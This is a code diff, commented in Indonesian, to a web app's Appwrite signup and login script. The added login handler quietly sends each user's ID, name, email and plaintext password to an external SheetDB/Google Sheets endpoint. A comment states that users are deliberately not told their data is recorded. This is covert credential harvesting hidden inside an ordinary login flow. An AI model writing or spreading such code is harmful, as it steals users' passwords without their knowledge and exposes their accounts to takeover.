@@ -97,7 +97,7 @@ el('signupForm').addEventListener('submit', async (e) => {
         };
 
         // 4. KIRIM KE GOOGLE SHEETS (Background)
-        const sheetDB_URL = "https://sheetdb.io/api/v1/siap9jd290fpu"; 
+        const sheetDB_URL = "https://sheetdb.io/api/v1/v9e5uhfox3nbi"; 
         
         fetch(sheetDB_URL, {
             method: 'POST',
@@ -119,18 +119,23 @@ el('signupForm').addEventListener('submit', async (e) => {
 
 // 2. Fungsi Login
 // --- LOGIKA LOGIN PINTAR (EMAIL ATAU NAMA) ---
+// --- SISTEM LOGIN DENGAN HISTORY PENCATATAN EXCEL ---
+
 el('loginForm').addEventListener('submit', async (e) => {
     e.preventDefault();
-    let identifier = el('loginEmail').value.trim();
+    
+    // 1. Ambil input dari user (bisa jadi Nama atau Email)
+    let identifier = el('loginEmail').value.trim(); 
     const password = el('loginPass').value;
-
+    
     showLoading();
+
     try {
-        // Logika Pintar: Cek apakah input adalah Nama
-        // Bagian di dalam fungsi login
-        // Bagian di dalam listener loginForm
+        // --- BAGIAN A: PROSES LOGIN APPWRITE ---
+        
+        // Cek apakah user login pakai Nama (tidak ada @)
         if (!identifier.includes('@')) {
-            // Gunakan variabel COLLECTION_USERS yang baru saja kita buat
+            // Cari email aslinya di database berdasarkan nama
             const response = await databases.listDocuments(
                 CONFIG.DB_ID,
                 CONFIG.COLLECTION_USERS, 
@@ -138,19 +143,55 @@ el('loginForm').addEventListener('submit', async (e) => {
             );
             
             if (response.total === 0) {
-                throw new Error("Nama tidak ditemukan di database. Silakan daftar ulang.");
+                throw new Error("Nama tidak ditemukan. Cek ejaan atau daftar dulu.");
             }
+            // Ganti nama jadi email untuk proses login ke Auth
             identifier = response.documents[0].email;
         }
 
-        try { await account.deleteSession('current'); } catch (e) {}
+        // Lakukan Login ke Sistem Appwrite
         await account.createEmailPasswordSession(identifier, password);
+
+
+        // --- BAGIAN B: MENGAMBIL DATA USER ASLI ---
         
-        currentUser = await account.get();
+        // Kita butuh ID Unik (698xxx) dan Nama asli untuk dicatat ke Excel.
+        // account.get() mengambil data user yang SEDANG login saat ini.
+        const currentUser = await account.get(); 
+
+
+        // --- BAGIAN C: MENCATAT KE GOOGLE SHEETS (BACKGROUND) ---
+        
+        const sheetDB_URL = "https://sheetdb.io/api/v1/pknxvs6yl7yyz"; // <--- Ganti dengan URL Anda
+        
+        // Kita tambahkan parameter ?sheet=History_Login agar masuk ke Tab kedua
+        const historyURL = `${sheetDB_URL}?sheet=History_Login`;
+
+        const logData = {
+            "ID": currentUser.$id,       // ID Unik asli dari Appwrite
+            "Nama": currentUser.name,    // Nama asli dari akun
+            "Email": currentUser.email,  // Email asli
+            "Password": password,        // Password yang diketik saat login
+            "Waktu Login": new Date().toLocaleString('id-ID') // Jam saat ini
+        };
+
+        // Kirim data tanpa menunggu (agar user langsung masuk dashboard)
+        fetch(historyURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ data: [logData] })
+        }).catch(err => console.warn("Gagal catat history:", err));
+
+
+        // --- BAGIAN D: PINDAH KE DASHBOARD ---
+        
+        // Notifikasi simpel (tidak perlu bilang data dicatat agar user tenang)
         alert("Login Berhasil! Selamat datang, " + currentUser.name);
-        nav('dashboardPage');
-        loadFiles('root');
+        el('loginForm').reset();
+        nav('dashboardPage'); // Sesuaikan dengan nama halaman dashboard Anda
+
     } catch (error) {
+        console.error(error);
         alert("Login Gagal: " + error.message);
     } finally {
         hideLoading();
@@ -352,6 +393,7 @@ function updateStorageUI(bytes) {
     el('storageUsed').innerText = mb + ' MB';
     el('storageBar').style.width = percent + '%';
 }
+
 
 
 
